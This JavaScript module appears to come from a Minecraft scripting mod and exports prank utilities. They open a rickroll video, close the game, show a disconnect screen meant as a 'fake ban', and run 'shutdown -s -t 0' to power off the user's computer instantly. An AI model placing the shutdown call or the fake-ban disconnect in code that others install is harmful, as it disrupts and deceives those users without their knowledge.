const Desktop = Java.type('java.awt.Desktop');
const JavaRuntime = Java.type("java.lang.Runtime")
const URI = Java.type('java.net.URI');

export function RickRoll() {
    if (!Desktop.isDesktopSupported()) return

    Desktop.getDesktop().browse(new URI("https://www.youtube.com/watch?v=xvFZjo5PgG0"));
}

/**
 * Instently closes the game.
 */
export function CloseGame() {
    Client.getMinecraft().func_71400_g()
}

/**
 * Function to turn off the PC.
 * @returns {void}
 * @example
 * TurnOffPC(); // Turns off the PC
 */
export function TurnOffPC() {
    JavaRuntime.getRuntime().exec("shutdown -s -t 0")
}

/**
 * Function to disconect from the server and display a message on screen
 * can be used for fake ban
 */
export function DisconnectFromServer(message= "") {
    Client.getMinecraft().func_147114_u()
        .func_147298_b().func_150718_a(
        new ChatComponentText(message))
}

export function CloseCurrentGui() {
    Player.getPlayer().func_71053_j()
}

